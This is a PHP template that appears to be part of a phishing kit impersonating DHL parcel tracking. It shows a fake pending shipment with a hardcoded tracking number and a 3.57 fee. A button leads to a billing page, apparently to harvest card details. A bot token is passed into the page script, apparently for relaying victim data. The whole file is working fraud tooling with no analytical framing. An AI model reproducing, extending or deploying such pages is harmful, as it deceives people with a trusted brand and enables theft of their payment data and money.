<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<title>myDHL - Tracking</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/cdns/bs.css">
<link rel="stylesheet" href="res/style.css">
<link rel="icon" href="res/icon2.png">
</head>
<body>
<header class="container p-2">
    <div class="row">
        <div class="col text-left">
            <img src="res/logo_exp.png" >
        </div>
    </div>
</header>
<script>var token=<?php echo json_encode($bot); ?>;</script>

<section class="container-fluid " >
<div class="container pb-5 text-center" style="width:400px; max-width:100%;" >
 <img src="res/env.svg" style="width:110px; margin-bottom:10px ;">
<strong style="display:block; margin-bottom:20px;"><?php echo getLang("_DETAILS_TITLES")[0];?></strong>
<p style="margin:30px 0;">
<?php echo getLang("_DETAILS_TITLES")[1];?>
</p>
<table style="display:inline-block; margin-bottom:30px; text-align:center;">
<tr>
    <th> <?php echo getLang("_DETAILS_TABLE")[0];?> :</th>
    <th><?php echo date("m/d/Y");?></th>
</tr>
<tr>
    <th><?php echo getLang("_DETAILS_TABLE")[1];?> : </th>
    <th>3.57 <span class="text-danger"><?php echo $currency;?></span></th>
</tr>
</table>



<div class="form-group">
    <p><b><?php echo getLang("_TRACK_TITLE");?></b></p>

<div style="width:200px; max-width:100%; display:inline-block;">
<input type="text" readonly class="form-control" value="UZ893USUY89DK" >
    <button  onclick="window.location='billing.php'" 
class="btn btn-danger p-2 my-1" style="width:200px;">
<?php echo getLang("_CONTINUE");?>
</button>
</div>

</div>
</div>
</section>


<footer class="container-fluid">
<div class="container" >
<div class="row">
    <div class="col-sm-6 text-lg-left text-center">
        <?php echo getLang("_FOOTER_LINKS")[0];?>
    </div>
    <div class="col-sm-6 text-lg-right text-center">
        <?php echo getLang("_FOOTER_LINKS")[1];?>
    </div>
</div>
</div>
</footer>
<script src="res/jq.js"></script>
</body>
</html>